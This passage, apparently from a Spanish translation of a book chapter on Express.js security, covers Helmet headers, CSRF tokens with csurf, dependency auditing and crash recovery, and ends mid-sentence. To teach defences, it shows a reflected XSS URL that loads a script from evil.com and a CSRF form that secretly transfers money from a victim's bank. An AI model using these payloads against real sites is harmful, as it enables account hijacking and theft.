+<p>Hay una cabecera de seguridad sencilla llamada X-XSS-Protection. No protege contra todos los tipos de XSS, pero sí contra lo que se conoce como XSS reflejado. El mejor ejemplo de XSS reflejado se encuentra en un motor de búsqueda inseguro. En cualquier motor de búsqueda, al realizar una búsqueda, la consulta aparece en la pantalla (normalmente en la parte superior). Si buscas «caramelos», la palabra aparecerá en la parte superior y formará parte de la URL.</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>https://mysearchengine.biz/search?query=candy
+</span></code></pre></div>
+Ahora imagina que estás buscando "<script src="http://evil.com/hack.js"></script>".</p>
+<p>La URL podría verse así:</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>https://mysearchengine.biz/search?query=&lt;script%20src=&quot;http://evil.com/hack.js&quot;&gt;&lt; script&gt;
+</span></code></pre></div>
+Ahora bien, si este motor de búsqueda inserta esa consulta en el HTML de la página, ¡habrás inyectado un script! Si te envío esta URL y haces clic en el enlace, puedo tomar el control y realizar acciones maliciosas.</p>
+<p>El primer paso para protegerte de este ataque es sanitizar la entrada del usuario. Después, puedes configurar el encabezado X-XSS-Protection para evitar que algunos navegadores ejecuten ese script si cometes algún error. En Helmet, solo se necesita una línea.</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>app.use(helmet.xssFilter());
+</span></code></pre></div>
+Helmet también permite configurar otro encabezado llamado Content-Security-Policy. Francamente, <code>Content-Security-Policy</code> podría ser un capítulo aparte. Consulta la guía de HTML5 Rocks en 
+<a href="http://www.html5rocks.com/en/tutorials/security-content-security-policy/">www.html5rocks.com/en/tutorials/security-content-security-policy/</a> para obtener más información, y una vez que la entiendas, usa el middleware csp de Helmet.</p>
+<p>Ninguno de estos encabezados de Helmet es tan importante como sanitizar la entrada del usuario, así que hazlo primero.</p>
+<h3 id="cross-site-request-forgery-csrf-prevention">Cross-site request forgery (CSRF) prevention<a class="headerlink" href="#cross-site-request-forgery-csrf-prevention" title="Permanent link">&para;</a></h3>
+<p>Imagina que estoy conectado a mi banco. Quieres que te transfiera un millón de dólares, pero no estás conectado con mi cuenta. (Otro problema: no tengo un millón de dólares). ¿Cómo puedes conseguir que te envíe el dinero?</p>
+<p><strong>EL ATAQUE</strong></p>
+<p>En la página web del banco, hay un formulario para transferir dinero. En este formulario, introduzco la cantidad y el destinatario, y pulso Enviar. En segundo plano, se realiza una solicitud POST a una URL. El banco verifica que mis cookies sean correctas y, si lo son, realiza la transferencia.</p>
+<p>Puedes hacer la solicitud POST con la cantidad y el destinatario, pero no conoces mi cookie ni puedes adivinarla; es una larga cadena de caracteres. ¿Y si pudieras obligarme a hacer la solicitud POST? Lo harías mediante la falsificación de solicitudes entre sitios (CSRF y, a veces, XSRF). Para llevar a cabo este ataque CSRF, básicamente tendrás que hacer que envíe un formulario sin darme cuenta. Imagina que has creado un formulario como el que aparece en el siguiente listado.</p>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span>
+<span class="normal"><a href="#__codelineno-13-2">2</a></span>
+<span class="normal"><a href="#__codelineno-13-3">3</a></span>
+<span class="normal"><a href="#__codelineno-13-4">4</a></span>
+<span class="normal"><a href="#__codelineno-13-5">5</a></span>
+<span class="normal"><a href="#__codelineno-13-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Transfer money<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://mybank.biz/transfermoney&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3"></a> <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;recipient&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;YourUsername&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4"></a> <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;amount&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1000000&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;number&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5"></a> <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Digamos que colocas esto en un archivo HTML en una página que controlas; por ejemplo,
+hacker.com/stealmoney.html. Podrías enviarme un correo electrónico diciendo: «¡Haz clic aquí para ver algunas fotos de mi gato!». Si hiciera clic, vería algo como la figura 10.3:</p>
+<p>Y si viera eso, sospecharía. No haría clic en «Enviar» y cerraría la ventana. Pero puedes usar JavaScript para enviar el formulario automáticamente, como se muestra aquí.</p>
+<p><img alt="" src="../trasnfermoney.png" /></p>
+<p><img alt="" src="../condetrasnfer.png" title="Envío automático del formulario" /></p>
+<p>Si me redirigen a esta página, el formulario se enviará inmediatamente y me llevará a mi banco, a una página que dice: «¡Enhorabuena, acaba de transferir un millón de dólares!». Probablemente entraré en pánico y llamaré a mi banco, y las autoridades seguramente podrán solucionarlo.</p>
+<p>Pero esto es un avance: ahora te estás enviando dinero a ti mismo. No lo mostraré aquí, pero puedes ocultarlo por completo a la víctima. Primero, crea un <code>&lt;iframe&gt;</code> en tu página. Luego, puedes usar el atributo target del formulario para que, al enviarlo, se envíe dentro del iframe, en lugar de en toda la página. Si haces que este iframe sea pequeño o invisible (¡fácil con CSS!), nunca sabré que me hackearon hasta que, de repente, tenga un millón menos de dólares.
+Mi banco necesita protegerse contra esto. ¿Pero cómo?</p>
+<p><strong>DESCRIPCIÓN GENERAL DE LA PROTECCIÓN CONTRA LA CSRF</strong></p>
+<p>Mi banco ya verifica las cookies para asegurarse de que soy quien digo ser. Un hacker no puede realizar ataques CSRF sin que yo haga algo. Pero una vez que el banco sabe que soy yo, ¿cómo sabe que tenía la intención de hacer algo y no que me engañaron para que lo hiciera?</p>
+<p>Mi banco decide lo siguiente: si un usuario envía una solicitud POST a mybank.biz/transfermoney, no lo hace al azar. Antes de realizar esa solicitud, el usuario
+estará en una página que le pregunta a dónde quiere transferir su dinero; tal vez la
+URL sea mybank.biz/transfermoney_form. </p>
+<p>Entonces, cuando el banco envía el HTML para mybank.biz/transfermoney_form,
+añade un elemento oculto al formulario: una cadena completamente aleatoria e imposible de adivinar llamada token. El formulario podría verse ahora como el código del siguiente listado.</p>
+<p><img alt="" src="../proteccion.png" title="" /></p>
+<p>Probablemente has usado miles de tokens CSRF mientras navegas por la web, pero no los has visto porque están ocultos para ti. (Los verás si eres como yo y disfrutas viendo el código fuente HTML de las páginas.) Ahora, cuando el usuario envía el formulario y realiza la solicitud POST, el banco se asegurará de que el token CSRF enviado sea el mismo que el que el usuario acaba de recibir. Si es así, el banco puede estar bastante seguro de que el usuario acaba de venir del sitio web del banco y, por lo tanto, tenía la intención de enviar el dinero. Si no lo es, el usuario podría estar siendo engañado—no envíes el dinero. En resumen, necesitas hacer dos cosas: 1. Crea un token CSRF aleatorio cada vez que pidas datos a los usuarios. 2. Valida ese token aleatorio cada vez que manejes esos datos.</p>
+<p><strong>PROTEGIÉNDOTE CONTRA CSRF EN EXPRESS</strong></p>
+<p>El equipo de Express tiene un middleware simple que realiza esas dos tareas: <strong>csurf</strong> (<a href="https://github.com/expressjs/csurf">https://github.com/expressjs/csurf</a>). El middleware csurf hace dos cosas:</p>
+<ul>
+<li><strong>Agrega un método al objeto request</strong> llamado <code>req.csrfToken()</code>. Enviarás este token cada vez que envíes un formulario, por ejemplo.</li>
+<li><strong>Si la solicitud no es GET</strong>, busca un parámetro llamado <code>_csrf</code> para validar la solicitud, creando un error si es inválido. (Técnicamente también omite las solicitudes HEAD y OPTIONS, pero son mucho menos comunes. Hay algunos otros lugares donde el middleware buscará tokens CSRF; consulta la documentación para más detalles).</li>
+</ul>
+<p>Para instalar este middleware, ejecuta: <code>npm install csurf --save</code>.</p>
+<p>El middleware csurf <strong>depende de algún middleware de sesión</strong> y <strong>middleware para parsear cuerpos de solicitud</strong>. Si necesitas protecciones CSRF, probablemente ya tienes algún concepto de usuarios, lo que significa que ya estás usando estos, pero <code>express-session</code> y <code>body-parser</code> hacen el trabajo.</p>
+<p><strong>Asegúrate de usarlos ANTES de csurf.</strong> </p>
+<p>Si necesitas un ejemplo, puedes revisar el código del capítulo 8 (<code>app.js</code>) o el ejemplo CSRF en: <a href="https://github.com/EvanHahn/Express.js-in-Action-code/blob/master/Chapter_10/csrf-example/app.js">https://github.com/EvanHahn/Express.js-in-Action-code/blob/master/Chapter_10/csrf-example/app.js</a>.</p>
+<p>Para usar el middleware, simplemente <strong>requiere y úsalo</strong>:</p>
+<div class="language-javascript highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span>
+<span class="normal"><a href="#__codelineno-14-2">2</a></span>
+<span class="normal"><a href="#__codelineno-14-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">session</span><span class="p">({</span><span class="w"> </span><span class="nx">secret</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;tu-secreto&#39;</span><span class="w"> </span><span class="p">}));</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span><span class="w"> </span><span class="nx">extended</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="p">}));</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">csurf</span><span class="p">({</span><span class="w"> </span><span class="nx">cookie</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">}));</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Una vez usado el middleware, puedes <strong>obtener el token al renderizar una vista</strong>:</p>
+<div class="language-javascript highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
+<span class="normal"><a href="#__codelineno-15-2">2</a></span>
+<span class="normal"><a href="#__codelineno-15-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/form&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a><span class="w">  </span><span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;form&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">csrfToken</span><span class="o">:</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">csrfToken</span><span class="p">()</span><span class="w"> </span><span class="p">});</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a><span class="p">});</span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>En tu template EJS/Pug:</strong>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span>
+<span class="normal"><a href="#__codelineno-16-2">2</a></span>
+<span class="normal"><a href="#__codelineno-16-3">3</a></span>
+<span class="normal"><a href="#__codelineno-16-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;/procesar&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2"></a>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;_csrf&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&lt;%= csrfToken %&gt;&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3"></a>  <span class="cm">&lt;!-- resto del formulario --&gt;</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></p>
+<p>Y eso es todo. Una vez que hayas agregado el token CSRF a tus formularios, el middleware <strong>csurf</strong> se encargará del resto. No es obligatorio, pero probablemente querrás tener algún tipo de <strong>manejador para errores CSRF fallidos</strong>. </p>
+<p>Puedes definir un <strong>middleware de error</strong> que verifique errores CSRF, como se muestra en el siguiente listado:</p>
+<div class="language-javascript highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
+<span class="normal"><a href="#__codelineno-17-2">2</a></span>
+<span class="normal"><a href="#__codelineno-17-3">3</a></span>
+<span class="normal"><a href="#__codelineno-17-4">4</a></span>
+<span class="normal"><a href="#__codelineno-17-5">5</a></span>
+<span class="normal"><a href="#__codelineno-17-6">6</a></span>
+<span class="normal"><a href="#__codelineno-17-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a><span class="c1">// Middleware de error para CSRF (colócalo DESPUÉS de todas tus rutas)</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="w"> </span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">code</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="s1">&#39;EBADCSRFTOKEN&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">next</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4"></a>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5"></a><span class="w">  </span><span class="c1">// Error CSRF específico</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6"></a><span class="w">  </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">403</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Token CSRF inválido. Intenta recargar la página.&#39;</span><span class="p">);</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7"></a><span class="p">});</span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>¿Dónde va este middleware?</strong>
+1. <strong>Después de todas tus rutas normales</strong>
+2. <strong>Después del middleware csurf</strong>
+3. <strong>Antes del manejador de errores genérico 500</strong></p>
+<p>De esta forma, cuando alguien envíe un formulario sin token válido (o con token incorrecto), en lugar de un error 500 genérico, obtendrás un mensaje claro y una respuesta HTTP 403 (Forbidden) específicamente para CSRF.</p>
+<p>Este manejador de errores devolverá "Error CSRF" si hay, bueno, un error CSRF. Podrías querer personalizar esta página de error, y también podrías querer que te envíe un mensaje —¡alguien está intentando hackear a uno de tus usuarios! Puedes colocar este manejador de errores donde quieras en tu stack de errores. Si quieres que sea el primer error que captures, ponlo primero. Si quieres que sea el último, puedes ponerlo al final.</p>
+<h2 id="mantener-tus-dependencias-seguras">Mantener tus dependencias seguras<a class="headerlink" href="#mantener-tus-dependencias-seguras" title="Permanent link">&para;</a></h2>
+<p>Cualquier aplicación Express dependerá de al menos un módulo de terceros: Express. Si el resto de este libro te ha mostrado algo, es que dependerás de muchos módulos de terceros. Esto tiene la enorme ventaja de que no tienes que escribir mucho código boilerplate, pero sí tiene un costo: estás confiando en estos módulos. ¿Qué pasa si el módulo crea un problema de seguridad? Hay tres grandes maneras de mantener tus dependencias seguras:</p>
+<ul>
+<li><strong>Audita el código tú mismo</strong></li>
+<li><strong>Asegúrate de estar en las últimas versiones</strong></li>
+<li><strong>Verifica contra el Node Security Project</strong></li>
+</ul>
+<h3 id="auditar-el-codigo">Auditar el código<a class="headerlink" href="#auditar-el-codigo" title="Permanent link">&para;</a></h3>
+<p>Puede sonar un poco loco, pero a menudo puedes auditar fácilmente el código de tus dependencias. Aunque algunos módulos como Express tienen un área de superficie relativamente grande, muchos de los módulos que instalarás tienen solo unas pocas líneas, y puedes entenderlos rápidamente. Es una forma fantástica de aprender, también. Así como podrías revisar tu propio código en busca de errores o bugs, puedes revisar el código de otras personas en busca de errores y bugs. Si los detectas, puedes evitar el módulo. Si te sientes generoso, puedes enviar parches porque estos paquetes son todos de código abierto. Si ya instalaste el módulo, puedes encontrar su código fuente en tu directorio <code>node_modules</code>. Casi siempre puedes encontrar módulos en GitHub con una búsqueda simple o desde un enlace en el registro de npm. También vale la pena verificar el estado general del proyecto. Si un módulo es antiguo pero funciona de manera confiable y no tiene bugs abiertos, entonces probablemente es seguro. ¡Pero si tiene muchos reportes de bugs y no ha sido actualizado en mucho tiempo, eso no es buena señal!</p>
+<h3 id="keeping-your-dependencies-up-to-date">Keeping your dependencies up to date<a class="headerlink" href="#keeping-your-dependencies-up-to-date" title="Permanent link">&para;</a></h3>
+<p>Siempre es una buena idea tener las últimas versiones de las cosas. La gente optimiza el rendimiento, corrige bugs y mejora las APIs. Podrías ir manualmente por cada una de tus dependencias para descubrir qué versiones están desactualizadas, o podrías usar una herramienta integrada en npm: <strong>npm outdated</strong>.</p>
+<p>Supongamos que tu proyecto tiene instalado <strong>Express 5.0.0</strong>, pero la última versión es <strong>5.4.3</strong> (que seguramente estará desactualizada para cuando leas esto). En el directorio de tu proyecto, ejecuta:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>npm<span class="w"> </span>outdated<span class="w"> </span>--depth<span class="w"> </span><span class="m">0</span>
+</span></code></pre></div>
+<p>Y verás una salida algo así:</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>Package     Current  Wanted  Latest  Location
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>express       5.0.0   5.0.0   5.4.3  node_modules/express
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>csurf        1.11.0  1.11.0   2.0.0  node_modules/csurf
+</span></code></pre></div>
+Si tienes otros paquetes desactualizados, este comando también los reportará. Ve a tu <code>package.json</code>, actualiza las versiones y ejecuta <code>npm install</code> para obtener las últimas versiones. Es una buena idea verificar paquetes desactualizados frecuentemente.</p>
+<blockquote>
+<p>¿Qué es eso del depth?</p>
+</blockquote>
+<p><code>npm outdated --depth 0</code> te dirá todos los módulos que están desactualizados y que <strong>tú has instalado directamente</strong>.</p>
+<p><code>npm outdated</code> <strong>sin el flag depth</strong> te dice módulos desactualizados, <strong>incluso los que no instalaste directamente</strong>. </p>
+<p>Por ejemplo, Express depende de un módulo llamado <code>cookie</code>. Si <code>cookie</code> se actualiza pero Express no se actualiza a la última versión de <code>cookie</code>, entonces recibirás una advertencia sobre <code>cookie</code>, aunque no sea tu culpa.</p>
+<p>No hay mucho que pueda hacer si Express no se actualiza a la última versión (eso está mayormente fuera de mi control), salvo actualizar a la última versión de Express (que sí está en mi control).</p>
+<p>El flag <code>--depth</code> solo muestra <strong>información actionable</strong>, mientras que sin él te da un montón de información que realmente no puedes usar.</p>
+<p>Otra nota al margen: también querrás asegurarte de estar en la <strong>última versión de Node</strong>. Verifica en <a href="https://nodejs.org">https://nodejs.org</a> y asegúrate de estar en la última versión.</p>
+<h3 id="consultalo-en-el-node-security-project">Consúltalo en el Node Security Project<a class="headerlink" href="#consultalo-en-el-node-security-project" title="Permanent link">&para;</a></h3>
+<p>A veces, los módulos tienen problemas de seguridad. Unos amables desarrolladores crearon el <strong>Node Security Project</strong>, un ambicioso proyecto para auditar todos los módulos del registro npm. Si encuentran un módulo inseguro, publican una advertencia en <a href="http://nodesecurity.io/advisories">http://nodesecurity.io/advisories</a>.</p>
+<p>El Node Security Project también viene con una herramienta de línea de comandos llamada <strong>nsp</strong>. Es una herramienta simple pero poderosa que escanea tu <code>package.json</code> en busca de dependencias inseguras (comparándolas contra su base de datos).</p>
+<p>Para instalarla, ejecuta:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>nsp
+</span></code></pre></div></p>
+<p>Ahora, en el mismo directorio que tu <code>package.json</code>, escribe:</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>nsp audit-package
+</span></code></pre></div>
+La mayoría de las veces, obtendrás un mensaje agradable que te dice que tus paquetes son conocidos como seguros. Pero a veces, una de tus dependencias (o, más frecuentemente, una de las dependencias de tus dependencias) tiene un agujero de seguridad. </p>
+<p>Por ejemplo, Express depende de un módulo llamado <strong>serve-static</strong>; este es <code>express.static</code>, el middleware de archivos estáticos. A principios de 2015, se encontró una vulnerabilidad en serve-static. Si estás usando una versión de Express que dependía de serve-static, ejecuta <code>nsp audit-package</code> y verás algo como esto:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>Name        Installed  Patched    Vulnerable Dependency
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>serve-static 1.7.1     &gt;=1.7.2    myproject &gt; express
+</span></code></pre></div>
+<p>Hay dos cosas importantes aquí. La columna izquierda te dice el <strong>nombre de la dependencia problemática</strong>. La columna derecha te muestra la <strong>cadena de dependencias</strong> que lleva al problema. </p>
+<p>En este ejemplo, tu proyecto (llamado <code>myproject</code>) es el primer problema, que depende de <strong>Express</strong>, que a su vez depende de <strong>serve-static</strong>. Esto significa que <strong>Express necesita actualizarse</strong> para obtener la última versión de serve-static.</p>
+<p>Si dependieras directamente de serve-static, solo verías el nombre de tu proyecto en la lista, así:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>Name        Installed  Patched    Vulnerable Dependency
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>serve-static 1.7.1     &gt;=1.7.2    myproject
+</span></code></pre></div>
+<p>Nota que los módulos aún pueden ser inseguros; hay <strong>tantos módulos en npm</strong> que el Node Security Project no puede auditarlos todos. Pero es <strong>otra herramienta útil</strong> para mantener tus apps seguras.</p>
+<h2 id="manejo-de-fallos-del-servidor">Manejo de fallos del servidor<a class="headerlink" href="#manejo-de-fallos-del-servidor" title="Permanent link">&para;</a></h2>
+<p>Tengo malas noticias: <strong>tus servidores podrían fallar en algún momento</strong>. Hay muchas cosas que pueden hacer que fallen tus servidores: tal vez hay un bug en tu código y estás referenciando una variable indefinida; tal vez un hacker ha encontrado una manera de hacer crashear tu servidor con entrada maliciosa; tal vez tus servidores han alcanzado su capacidad. Desafortunadamente, estos servidores pueden volverse salvajemente complicados, y en algún momento, podrían fallar. </p>
+<p>Y aunque este capítulo tiene consejos para ayudar a mantener tus apps funcionando sin problemas, <strong>no quieres que un crash arruine completamente tu día</strong>. Debes recuperarte de los crashes y seguir adelante. </p>
+<p>Existe una herramienta simple llamada <strong>Forever</strong> (<a href="https://github.com/foreverjs/forever">https://github.com/foreverjs/forever</a>) que puede ayudarte con esto. Su nombre podría ser una pista: <strong>mantiene tus apps corriendo para siempre</strong>. La parte importante: <strong>si tu app falla, Forever intentará reiniciarla</strong>.</p>
+<p>Para instalar Forever, ejecuta:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>npm<span class="w"> </span>install<span class="w"> </span>forever<span class="w"> </span>--save
+</span></code></pre></div></p>
+<p>Probablemente has tenido un script <code>npm start</code> en tu <code>package.json</code> por un tiempo, y necesitas cambiarlo del código en el siguiente listado al de la lista 10.14.</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1">// A classic npm start script</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="nt">&quot;scripts&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="w"> </span><span class="nt">&quot;start&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;node app.js&quot;</span>
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="p">}</span>
+</span></code></pre></div>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nt">&quot;scripts&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="w"> </span><span class="nt">&quot;start&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;forever app.js&quot;</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>¡Y ahora tu servidor se reiniciará si falla!</p>
+<p><strong>NOTA</strong>: Puedes ver un ejemplo simple de código en acción en el repositorio de código fuente del libro en <a href="https://github.com/EvanHahn/Express.js-in-Action-code/tree/master/Chapter_10/forever-example">https://github.com/EvanHahn/Express.js-in-Action-code/tree/master/Chapter_10/forever-example</a></p>
+<h2 id="varios-pequenos-trucos">Varios pequeños trucos<a class="headerlink" href="#varios-pequenos-trucos" title="Permanent link">&para;</a></h2>
+<p>Hemos cubierto la mayoría de los grandes temas como cross-site scripting y HTTPS. Hay algunos otros trucos que puedes emplear para hacer que tus aplicaciones Express sean aún más seguras. Los temas en esta sección no son tan esenciales como los anteriores, pero son rápidos y fáciles y pueden reducir el número de lugares por donde pueden atacarte.</p>
+<h3 id="sin-express-aqui">Sin Express aquí<a class="headerlink" href="#sin-express-aqui" title="Permanent link">&para;</a></h3>
+<p>Si un hacker quiere entrar en tu sitio, tiene muchas cosas que probar. Si saben que tu sitio está impulsado por Express y saben que Express o Node tiene algún tipo de falla de seguridad, pueden intentar explotarla. ¡Sería mejor dejar a los hackers en la oscuridad sobre esto!</p>
+<p><strong>Por defecto, Express se publicita</strong>. En cada solicitud, hay un header HTTP que identifica tu sitio como impulsado por Express:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>X-Powered-By: Express
+</span></code></pre></div>
+<p>Puedes desactivarlo fácilmente con una configuración:
